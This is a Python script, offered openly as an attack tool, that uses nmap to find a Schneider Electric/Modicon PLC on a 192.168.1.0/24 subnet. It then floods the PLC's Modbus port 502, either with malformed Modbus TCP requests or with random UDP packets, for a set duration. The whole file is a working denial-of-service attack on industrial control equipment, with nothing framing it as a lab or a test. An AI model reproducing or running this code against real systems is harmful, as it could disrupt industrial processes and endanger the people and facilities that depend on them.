import socket
import time
import struct
import sys
import os
import subprocess

# Configuration parameters
# If you know the PLC IP, you can hardcode it here. Otherwise, the script will attempt to discover it.
PLC_IP = None  # Set to None to enable IP discovery, or to "192.168.1.100" (example) if known.
PORT = 502  # Modbus port
ATTACK_DURATION = 60  # Attack duration in seconds
PACKET_RATE = 0.001 # Time to wait between each packet in seconds.  Higher = lower rate.
MAX_PACKET_SIZE = 1472  # Maximum size of the UDP packet (Ethernet MTU - IP Header - UDP Header = 1500 - 20 - 8 = 1472)
ATTACK_TYPE = "UDP_FLOOD" # Options: "MODBUS_MALFORMED", "UDP_FLOOD"

# Error message function
def error_message(msg):
    print(f"Error: {msg}")
    sys.exit(1)

def discover_plc_ip():
    """
    Attempts to discover the PLC's IP address using nmap.

    Returns:
        str: The IP address of the PLC if found, None otherwise.
    """
    try:
        # Run nmap to discover devices on the local network.  This requires nmap to be installed.
        # Adjust the subnet to match your network configuration.
        output = subprocess.check_output(["nmap", "-sn", "192.168.1.0/24"]).decode("utf-8")

        #Look for "Schneider Electric" or "Modicon" in the nmap output to identify the PLC. Adjust based on nmap output.
        for line in output.splitlines():
            if "Schneider Electric" in line or "Modicon" in line: #Adjust this string to match the possible nmap results on your network.
                ip_address = line.split()[-1]  # Extract the IP address from the nmap output. Assumes IP is the last word
                print(f"PLC IP address found: {ip_address}")
                return ip_address
        print("PLC IP address not found using nmap.  Check nmap installation and network configuration.")
        return None
    except FileNotFoundError:
        print("nmap is not installed.  Please install nmap and ensure it is in your PATH to use auto-discovery.")
        return None
    except subprocess.CalledProcessError as e:
        print(f"Error running nmap: {e}")
        return None

def modbus_malformed_attack(plc_ip, port):
    """
    Sends malformed Modbus TCP requests to the PLC.
    """
    print("Starting Modbus malformed request DoS attack...")
    start_time = time.time()
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.connect((plc_ip, port))
        print(f"Connected to {plc_ip}:{port}")

        while time.time() - start_time < ATTACK_DURATION:
            #Craft a malformed Modbus request. Example: Invalid function code.
            #Transaction Identifier, Protocol Identifier, Length, Unit Identifier, Function Code, Data
            malformed_request = b'\x00\x01\x00\x00\x00\x02\x01\x80' #Invalid function code 128 (0x80).
            try:
                sock.sendall(malformed_request)
                print("Sent Malformed request.")
            except socket.error as e:
                print(f"Socket Error: {e}")
                break
            time.sleep(PACKET_RATE)

    except socket.error as e:
        print(f"Could not connect to PLC: {e}")
    finally:
        sock.close()
        print("Modbus malformed request attack finished.")

def udp_flood_attack(plc_ip, port):
    """
    Sends UDP flood to the PLC's Modbus port.
    """
    print("Starting UDP flood DoS attack...")
    start_time = time.time()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    try:
        while time.time() - start_time < ATTACK_DURATION:
            #Generate random data for UDP packets
            data = os.urandom(MAX_PACKET_SIZE)

            try:
                sock.sendto(data, (plc_ip, port))
            except socket.error as e:
                print(f"Socket Error: {e}")
                break
            time.sleep(PACKET_RATE)

    except Exception as e:
        print(f"Error during attack: {e}")
    finally:
        sock.close()
        print("UDP flood attack finished.")


if __name__ == "__main__":

    if PLC_IP is None:
        PLC_IP = discover_plc_ip()
        if PLC_IP is None:
            error_message("Could not discover PLC IP address.  Please specify it manually or check network config and nmap installation")

    if ATTACK_TYPE == "MODBUS_MALFORMED":
        modbus_malformed_attack(PLC_IP, PORT)
    elif ATTACK_TYPE == "UDP_FLOOD":
        udp_flood_attack(PLC_IP, PORT)
    else:
        error_message("Invalid ATTACK_TYPE. Choose MODBUS_MALFORMED or UDP_FLOOD")

    print("Script finished.")